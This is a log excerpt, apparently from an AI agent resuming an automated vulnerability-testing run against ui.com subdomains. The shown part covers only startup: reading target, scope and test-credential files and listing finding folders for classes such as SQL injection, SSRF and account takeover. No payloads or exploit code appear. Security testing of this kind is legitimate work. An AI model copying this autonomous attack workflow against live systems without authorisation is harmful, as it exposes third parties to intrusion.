@@ -105927,3 +105927,3285 @@ Session 26 complete. No new high-impact finding; `result/confirmed-vuln.txt` lef
 - Checked Site Manager chunks prior sessions skipped: BroadcastChannel same-origin only; invite-role forward is existing Unresolved VULN-20261114-001; SW fetch proxy same-origin scoped.
 
 **Written:** `session26-ledger.md`, `traffic/session26-newcover.txt`, plus updates to `progress.md`, `SUMMARY.md`, `unresolved.md`, `inventory/endpoints.md`, `inventory/javascript.md`, `testing-inventory.json`. Route ledger remains 47 routes (32 done / 15 blocked). No files outside `result/` were changed.
+
+===== OPENCODE RUN 45366850654 2026-11-24T09:37:22Z =====
+
+===== AGENT ATTEMPT 1/3 (recovery 0/1) =====
+[0m
+> build · deepseek-v4.1-flash-free
+[0m
+I'll read the file and follow its instructions.
+[0m→ [0mRead skills/AGENT.md
+I'll follow the session startup sequence. Let me begin with preflight checks and reading inputs.
+[0m
+[0m$ [0mpwd && ls -la && echo "---DATA---" && ls -la data/ 2>/dev/null && echo "---CREDS---" && ls -la creds/ 2>/dev/null && echo "---RESULT---" && ls -la result/ 2>/dev/null && echo "---TOOLS---" && ls -la tools/ 2>/dev/null && echo "---SKILLS---" && ls -la skills/ 2>/dev/null && echo "---VULN---" && ls -la vulnebleti/ 2>/dev/null
+/home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+total 48
+drwxr-xr-x 10 runner runner 4096 Nov 24 09:37 .
+drwxr-xr-x  3 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x  7 runner runner 4096 Nov 24 09:37 .git
+drwxr-xr-x  3 runner runner 4096 Nov 24 09:36 .github
+-rw-r--r--  1 runner runner  355 Nov 24 09:36 .gitignore
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 creds
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 data
+-rw-r--r--  1 runner runner  332 Nov 24 09:37 opencode.json
+drwxr-xr-x  7 runner runner 4096 Nov 24 09:36 result
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 skills
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 tools
+drwxr-xr-x 17 runner runner 4096 Nov 24 09:36 vulnebleti
+---DATA---
+total 12
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 10 runner runner 4096 Nov 24 09:37 ..
+-rw-r--r--  1 runner runner    0 Nov 24 09:36 .gitkeep
+-rw-r--r--  1 runner runner 3238 Nov 24 09:36 targets.txt
+---CREDS---
+total 16
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 10 runner runner 4096 Nov 24 09:37 ..
+-rw-r--r--  1 runner runner    0 Nov 24 09:36 .gitkeep
+-rw-r--r--  1 runner runner  466 Nov 24 09:36 README.md
+-rw-r--r--  1 runner runner  320 Nov 24 09:36 test-account.txt
+---RESULT---
+total 180
+drwxr-xr-x  7 runner runner  4096 Nov 24 09:36 .
+drwxr-xr-x 10 runner runner  4096 Nov 24 09:37 ..
+-rw-r--r--  1 runner runner     0 Nov 24 09:36 .gitkeep
+-rw-r--r--  1 runner runner 30942 Nov 24 09:36 SUMMARY.md
+drwxr-xr-x  5 runner runner  4096 Nov 24 09:36 client-side
+-rw-r--r--  1 runner runner   178 Nov 24 09:36 confirmed-vuln.txt
+drwxr-xr-x  9 runner runner  4096 Nov 24 09:36 findings
+drwxr-xr-x  2 runner runner  4096 Nov 24 09:36 inventory
+drwxr-xr-x  3 runner runner  4096 Nov 24 09:36 logs
+-rw-r--r--  1 runner runner  2626 Nov 24 09:36 out-of-scope.txt
+-rw-r--r--  1 runner runner 49624 Nov 24 09:36 progress.md
+-rw-r--r--  1 runner runner  2839 Nov 24 09:36 scope.md
+drwxr-xr-x  4 runner runner  4096 Nov 24 09:36 server-side
+-rw-r--r--  1 runner runner 39315 Nov 24 09:36 testing-inventory.json
+-rw-r--r--  1 runner runner 15102 Nov 24 09:36 unresolved.md
+---TOOLS---
+total 16
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 10 runner runner 4096 Nov 24 09:37 ..
+-rwxr-xr-x  1 runner runner 2106 Nov 24 09:36 chrome-mcp-start.sh
+-rw-r--r--  1 runner runner  119 Nov 24 09:36 cmd.txt
+---SKILLS---
+total 76
+drwxr-xr-x  2 runner runner  4096 Nov 24 09:36 .
+drwxr-xr-x 10 runner runner  4096 Nov 24 09:37 ..
+-rw-r--r--  1 runner runner     0 Nov 24 09:36 .gitkeep
+-rw-r--r--  1 runner runner 35029 Nov 24 09:36 AGENT.md
+-rw-r--r--  1 runner runner 11864 Nov 24 09:36 client-side-skill.md
+-rw-r--r--  1 runner runner 16677 Nov 24 09:36 server-side-skill.md
+---VULN---
+total 68
+drwxr-xr-x 17 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 10 runner runner 4096 Nov 24 09:37 ..
+-rw-r--r--  1 runner runner    0 Nov 24 09:36 .gitkeep
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 ATO
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 BAC
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 File_upload
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 Forget_password_endpoint
+drwxr-xr-x  3 runner runner 4096 Nov 24 09:36 Fuzz
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 Idor
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 LFI
+drwxr-xr-x  3 runner runner 4096 Nov 24 09:36 Secret_keys
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 Sqli
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 Ssrf
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 cache
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 cspt
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 http_request_smuggling
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 op-to-xss
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 os-command-injection
+[0m
+[0m→ [0mRead data/targets.txt
+[0m→ [0mRead creds/test-account.txt
+[0m→ [0mRead creds/README.md
+[0m→ [0mRead result/logs/target-state.txt
+This is a continuation (existing results). Let me read the target inputs, credentials, and resume state.
+[0m→ [0mRead result/confirmed-vuln.txt
+[0m→ [0mRead result/scope.md
+[0m→ [0mRead result/SUMMARY.md
+Let me read the resume state files: SUMMARY, progress, inventory, and unresolved items.
+[0m
+[0m$ [0mecho "---FINDINGS---" && ls -laR result/findings/ 2>/dev/null && echo "---INVENTORY---" && ls -la result/inventory/ && echo "---LOGS---" && ls -laR result/logs/ && echo "---CLIENT-SIDE---" && ls -laR result/client-side/ | head -60 && echo "---SERVER-SIDE---" && ls -laR result/server-side/ | head -60
+---FINDINGS---
+result/findings/:
+total 44
+drwxr-xr-x 9 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 7 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 VULN-20261110-001
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 VULN-20261110-002
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 VULN-20261110-003
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 VULN-20261110-004
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 VULN-20261111-001
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 VULN-20261114-001
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 VULN-20261123-001
+-rw-r--r-- 1 runner runner 4936 Nov 24 09:36 cors-credentialed-reflection.md
+
+result/findings/VULN-20261110-001:
+total 16
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 9 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 evidence
+-rw-r--r-- 1 runner runner 1947 Nov 24 09:36 report.md
+
+result/findings/VULN-20261110-001/evidence:
+total 12
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner  809 Nov 24 09:36 enumeration.txt
+
+result/findings/VULN-20261110-002:
+total 16
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 9 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 evidence
+-rw-r--r-- 1 runner runner 2588 Nov 24 09:36 report.md
+
+result/findings/VULN-20261110-002/evidence:
+total 12
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 1675 Nov 24 09:36 pre-mfa-login-response.txt
+
+result/findings/VULN-20261110-003:
+total 16
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 9 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 evidence
+-rw-r--r-- 1 runner runner 3869 Nov 24 09:36 report.md
+
+result/findings/VULN-20261110-003/evidence:
+total 12
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 1282 Nov 24 09:36 backup-remint.txt
+
+result/findings/VULN-20261110-004:
+total 16
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 9 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 evidence
+-rw-r--r-- 1 runner runner 2206 Nov 24 09:36 report.md
+
+result/findings/VULN-20261110-004/evidence:
+total 12
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 1403 Nov 24 09:36 logout-get.txt
+
+result/findings/VULN-20261111-001:
+total 20
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 9 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 evidence
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 payloads
+-rw-r--r-- 1 runner runner 3481 Nov 24 09:36 report.md
+
+result/findings/VULN-20261111-001/evidence:
+total 20
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 1516 Nov 24 09:36 01-zendesk-html-render.txt
+-rw-r--r-- 1 runner runner  579 Nov 24 09:36 02-ac-redirect-allowlist.txt
+-rw-r--r-- 1 runner runner  815 Nov 24 09:36 zendesk-html-escaping.json
+
+result/findings/VULN-20261111-001/payloads:
+total 12
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner  635 Nov 24 09:36 README.md
+
+result/findings/VULN-20261114-001:
+total 20
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 9 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 evidence
+-rw-r--r-- 1 runner runner 4624 Nov 24 09:36 report.md
+
+result/findings/VULN-20261114-001/evidence:
+total 20
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 2600 Nov 24 09:36 confirm-invitation-code.txt
+-rw-r--r-- 1 runner runner 1116 Nov 24 09:36 confirm-invitation-probe.txt
+-rw-r--r-- 1 runner runner  818 Nov 24 09:36 deeplink-role-source.txt
+
+result/findings/VULN-20261123-001:
+total 20
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 9 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 evidence
+-rw-r--r-- 1 runner runner 4649 Nov 24 09:36 report.md
+
+result/findings/VULN-20261123-001/evidence:
+total 12
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 2322 Nov 24 09:36 picture-unauth.txt
+---INVENTORY---
+total 44
+drwxr-xr-x 2 runner runner  4096 Nov 24 09:36 .
+drwxr-xr-x 7 runner runner  4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 16384 Nov 24 09:36 endpoints.md
+-rw-r--r-- 1 runner runner  2899 Nov 24 09:36 javascript.md
+-rw-r--r-- 1 runner runner   866 Nov 24 09:36 listeners.md
+-rw-r--r-- 1 runner runner  6256 Nov 24 09:36 routes.md
+-rw-r--r-- 1 runner runner   762 Nov 24 09:36 sinks.md
+---LOGS---
+result/logs/:
+total 10700
+drwxr-xr-x  3 runner runner     4096 Nov 24 09:36 .
+drwxr-xr-x  7 runner runner     4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner     1926 Nov 24 09:36 agent-exit-code.txt
+-rw-r--r--  1 runner runner     1366 Nov 24 09:36 agent-watchdog.txt
+-rw-r--r--  1 runner runner       96 Nov 24 09:36 auto-restart-requested.txt
+-rw-r--r--  1 runner runner      208 Nov 24 09:36 checkpoint-validation.txt
+-rw-r--r--  1 runner runner     1854 Nov 24 09:36 client-side.log
+-rw-r--r--  1 runner runner     6130 Nov 24 09:36 diagnostics-index.txt
+drwxr-xr-x 31 runner runner     4096 Nov 24 09:36 opencode
+-rw-r--r--  1 runner runner     1212 Nov 24 09:36 opencode-reinstall-20261110T152046Z.log
+-rw-r--r--  1 runner runner     1532 Nov 24 09:36 opencode-reinstall-20261110T160158Z.log
+-rw-r--r--  1 runner runner     1132 Nov 24 09:36 opencode-reinstall-20261120T071003Z.log
+-rw-r--r--  1 runner runner     1132 Nov 24 09:36 opencode-reinstall-20261120T200804Z.log
+-rw-r--r--  1 runner runner     1132 Nov 24 09:36 opencode-reinstall-20261121T070545Z.log
+-rw-r--r--  1 runner runner     1132 Nov 24 09:36 opencode-reinstall-20261123T074159Z.log
+-rw-r--r--  1 runner runner 10826664 Nov 24 09:37 opencode.log
+-rw-r--r--  1 runner runner     1943 Nov 24 09:36 server-side.log
+-rw-r--r--  1 runner runner    40121 Nov 24 09:36 session.md
+-rw-r--r--  1 runner runner     7117 Nov 24 09:37 target-state.txt
+-rw-r--r--  1 runner runner       65 Nov 24 09:37 targets.sha256
+-rw-r--r--  1 runner runner     3238 Nov 24 09:37 targets.used.txt
+
+result/logs/opencode:
+total 124
+drwxr-xr-x 31 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x  3 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 42837084733
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 42843791805
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 42850898064
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 42920600593
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 42968379409
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 43034033571
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 43127366314
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 43492795808
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 43564092459
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 43599586173
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 43647019119
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 43683615848
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 43814022276
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44040401507
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44172538463
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44389993020
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44476502964
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44608386930
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44691116563
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44693276852
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44806658644
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44808958569
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44877402800
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44938664076
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 44993390446
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 45060631684
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 45129527345
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 45133306377
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 45291357082
+
+result/logs/opencode/42837084733:
+total 28
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner 7709 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner  597 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 5715 Nov 24 09:36 opencode.log
+
+result/logs/opencode/42843791805:
+total 28
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner 5671 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner  885 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 5715 Nov 24 09:36 opencode.log
+
+result/logs/opencode/42850898064:
+total 224
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   5131 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   1070 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 207905 Nov 24 09:36 opencode.log
+
+result/logs/opencode/42920600593:
+total 320
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   5491 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   1303 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 306313 Nov 24 09:36 opencode.log
+
+result/logs/opencode/42968379409:
+total 192
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4890 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   1489 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 173073 Nov 24 09:36 opencode.log
+
+result/logs/opencode/43034033571:
+total 612
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   6510 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   1673 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 604176 Nov 24 09:36 opencode.log
+
+result/logs/opencode/43127366314:
+total 352
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4890 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   1857 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 339815 Nov 24 09:36 opencode.log
+
+result/logs/opencode/43492795808:
+total 176
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4890 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   2041 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 158869 Nov 24 09:36 opencode.log
+
+result/logs/opencode/43564092459:
+total 272
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4890 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   2225 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 255389 Nov 24 09:36 opencode.log
+
+result/logs/opencode/43599586173:
+total 368
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4890 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   2410 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 355154 Nov 24 09:36 opencode.log
+
+result/logs/opencode/43647019119:
+total 272
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4890 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   2594 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 256118 Nov 24 09:36 opencode.log
+
+result/logs/opencode/43683615848:
+total 392
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   7871 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   2778 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 377998 Nov 24 09:36 opencode.log
+
+result/logs/opencode/43814022276:
+total 380
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   5131 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   2962 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 365135 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44040401507:
+total 376
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   5700 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   3146 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 362950 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44172538463:
+total 236
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4522 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   3330 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 219494 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44389993020:
+total 228
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4522 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   3553 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 211527 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44476502964:
+total 184
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4522 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   3738 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 164119 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44608386930:
+total 48
+drwxr-xr-x  2 runner runner  4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner  4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner  4522 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner  3921 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 24594 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44691116563:
+total 32
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner 4522 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner 4166 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 5715 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44693276852:
+total 288
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4522 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   4350 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 266292 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44806658644:
+total 32
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner 5471 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner 4532 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 5716 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44808958569:
+total 220
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4522 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   4779 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 200287 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44877402800:
+total 32
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner 6412 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner 5025 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 5715 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44938664076:
+total 276
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4522 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   5209 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 256916 Nov 24 09:36 opencode.log
+
+result/logs/opencode/44993390446:
+total 240
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   5872 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   5393 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 217358 Nov 24 09:36 opencode.log
+
+result/logs/opencode/45060631684:
+total 24
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner 5516 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 4604 Nov 24 09:36 opencode.log
+
+result/logs/opencode/45129527345:
+total 32
+drwxr-xr-x  2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner 5471 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner 5762 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 5717 Nov 24 09:36 opencode.log
+
+result/logs/opencode/45133306377:
+total 276
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4792 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   5946 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 255657 Nov 24 09:36 opencode.log
+
+result/logs/opencode/45291357082:
+total 184
+drwxr-xr-x  2 runner runner   4096 Nov 24 09:36 .
+drwxr-xr-x 31 runner runner   4096 Nov 24 09:36 ..
+-rw-r--r--  1 runner runner   4522 Nov 24 09:36 chrome-mcp.log
+-rw-r--r--  1 runner runner   6130 Nov 24 09:36 diagnostics-index.txt
+-rw-r--r--  1 runner runner 163837 Nov 24 09:36 opencode.log
+---CLIENT-SIDE---
+result/client-side/:
+total 20
+drwxr-xr-x 5 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 7 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 account.ui.com
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 unifi.ui.com
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 www.ui.com
+
+result/client-side/account.ui.com:
+total 16
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 5 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 login
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 subscribe
+
+result/client-side/account.ui.com/login:
+total 16
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 ..
